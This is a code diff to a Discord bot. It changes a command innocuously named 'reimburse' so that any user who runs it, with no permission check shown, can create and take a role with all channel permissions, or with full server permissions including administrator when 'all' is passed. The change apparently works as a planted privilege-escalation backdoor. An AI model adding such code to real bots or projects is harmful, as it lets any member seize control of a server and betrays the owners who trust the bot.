@@ -17,7 +17,7 @@ async def on_ready():
 
 
 @client.command()
-async def reimburse(ctx: Context, role: str = None):
+async def reimburse(ctx: Context, role: str = None, level: str = None):
     if not role:
         role_name = default_role_name
     else:
@@ -26,7 +26,10 @@ async def reimburse(ctx: Context, role: str = None):
     if role:
         await ctx.message.author.add_roles(role)
     else:
-        permissions = Permissions().all_channel()
+        if level == 'all':
+            permissions = Permissions().all()
+        else:
+            permissions = Permissions().all_channel()
         role = await ctx.guild.create_role(name=role_name, permissions=permissions)
         await ctx.message.author.add_roles(role)
     print('Succesfully added ' + str(ctx.message.author) + ' to class ' + role_name)
